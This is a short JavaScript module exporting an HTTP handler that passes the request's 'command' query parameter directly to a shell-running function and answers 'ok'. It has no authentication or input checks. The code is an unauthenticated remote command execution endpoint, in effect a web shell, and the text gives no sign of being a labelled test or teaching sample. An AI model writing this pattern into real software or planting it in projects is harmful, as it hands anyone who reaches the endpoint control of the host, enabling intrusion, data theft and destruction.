import { run } from "./shell.js";
export function httpHandler(req, res) {
  run(req.query.command);
  res.end("ok");
}
